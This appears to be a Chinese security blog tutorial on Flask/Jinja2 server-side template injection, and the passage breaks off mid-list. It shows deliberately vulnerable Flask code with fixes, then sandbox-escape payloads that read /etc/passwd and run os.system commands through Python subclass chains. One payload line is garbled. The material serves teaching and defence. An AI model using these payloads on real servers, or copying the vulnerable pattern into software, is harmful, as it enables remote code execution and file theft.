&lt;h4 id=&#34;flaskjinja2模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flaskjinja2模板注入&#34;&gt;#&lt;/a&gt; Flask/jinja2 模板注入&lt;/h4&gt;
&lt;p&gt;Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 &lt;code&gt;&amp;#123;&amp;#123;…&amp;#125;&amp;#125;&lt;/code&gt;  块&lt;/p&gt;
&lt;p&gt;Jinja2 使用 &lt;code&gt; &amp;#123;&amp;#123;name&amp;#125;&amp;#125;&lt;/code&gt;  结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。&lt;/p&gt;
&lt;p&gt;Jinja2 模板同样支持控制语句，像在  &lt;code&gt;&amp;#123;%…%&amp;#125;&lt;/code&gt;  块中&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#123;% for comment in comments %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &amp;lt;li&amp;gt;&amp;#123;&amp;#123;comment&amp;#125;&amp;#125;&amp;lt;/li&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;模板的不安全使用：示例 1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from flask import Flask, request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from jinja2 import Template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;quot;/&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = request.args.get(&amp;#x27;name&amp;#x27;, &amp;#x27;guest&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t = Template(&amp;quot;Hello &amp;quot; + name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return t.render()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;quot;__main__&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;t = Template (“hello” + name) 这行代码表示，将前端输入的 name 拼接到模板，此时 name 的输入没有经过任何检测，尝试使用模板语言测试：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200903130738597-1463882629.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果使用一个固定好了的模板，在模板渲染之后传入数据，就不存在模板注入，就好像 SQL 注入的预编译一样，修复上面代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from flask import Flask, request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from jinja2 import Template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;quot;/&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = request.args.get(&amp;#x27;name&amp;#x27;, &amp;#x27;guest&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t = Template(&amp;quot;Hello &amp;#123;&amp;#123;n&amp;#125;&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return t.render(n=name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;quot;__main__&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;模板的不安全使用：示例 2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from flask import Flask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from flask import render_template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from flask import request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from flask import render_template_string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/test&amp;#x27;,methods=[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def test():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    template = &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;div class=&amp;quot;center-content error&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;lt;h1&amp;gt;Oops! That page doesn&amp;#x27;t exist.&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;lt;h3&amp;gt;%s&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;/div&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27; %(request.url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return render_template_string(template)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.debug = True&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正常代码：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/index&amp;#x27;)#我们访问/或者/index都会跳转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return render_template(&amp;quot;index.html&amp;quot;,title=&amp;#x27;Home&amp;#x27;,user=request.args.get(&amp;quot;key&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;发现`&amp;#123;&amp;#123; --- &amp;#125;&amp;#125;`其中的语句被执行了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- 这是因为在flask中，渲染引擎Jinja2会将`&amp;#123;&amp;#123; --- &amp;#125;&amp;#125;`视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- 那么，在上一段代码中，如果我们传入的参数内容为`&amp;#123;&amp;#123; --- &amp;#125;&amp;#125;`包裹的代码，这些代码就会被执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;两种代码的形式是，一种当字符串来渲染并且使用了`%(request.url)`，另一种规范使用index.html渲染文件。我们漏洞代码使用了`render_template_string`函数，而如果我们使用`render_template`函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码`&amp;#123;&amp;#123;&amp;#125;&amp;#125;`你将会发现如下：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203104033489.png&#34; alt=&#34;image-20221203104033489&#34;&gt;&lt;/p&gt;
&lt;p&gt;在上述例子中，虽然已经可以实现任意代码执行，但由于模板本身的沙盒安全机制，某些语句虽然可以执行，却不会执行成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/38cb12c26e49b5678b9c682fc2f9548c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;即使在服务器端将 os 包含进来，但是在渲染时仍然会出现这个错误，这就是因为沙盒机制严格地限制了程序的行为&lt;/p&gt;
&lt;p&gt;沙箱逃逸的过程简单讲如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/eb3b14325cb6de4c69ef852c3affd370.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于在 jinja2 中是可以直接访问 python 的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__dict__　　 ：保存类实例或对象实例的属性变量键值对字典&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__class__　　：返回一个实例所属的类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// __base__和__mro__都是用来寻找基类的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__subclasses__　　：以列表返回类的子类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init__　　 ：类的初始化方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;amp;&amp;amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;jinja2 使用 file 读取文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;python3 已经移除了 file。所以利用 file 子类文件读取只能在 python2 中用。&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% if c.__name__==&amp;#x27;file&amp;#x27; %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123; c(&amp;quot;/etc/passwd&amp;quot;).readlines() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;jinja2 命令执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# python2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&amp;#x27;os&amp;#x27;].system(&amp;#x27;whoami&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[73].__init__.__globals__[&amp;#x27;os&amp;#x27;].system(&amp;#x27;whoami&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&amp;#x27;os&amp;#x27;].system(&amp;#x27;whoami&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&amp;#x27;os&amp;#x27;].system(&amp;#x27;whoami&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](&amp;quot;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;whoami&amp;#x27;)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](&amp;quot;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;whoami&amp;#x27;)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;获得基类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#python2.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;.__class__.__mro__[2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;request.__class__.__mro__[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#python3.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;.__。。。class__.__mro__[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;.__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span 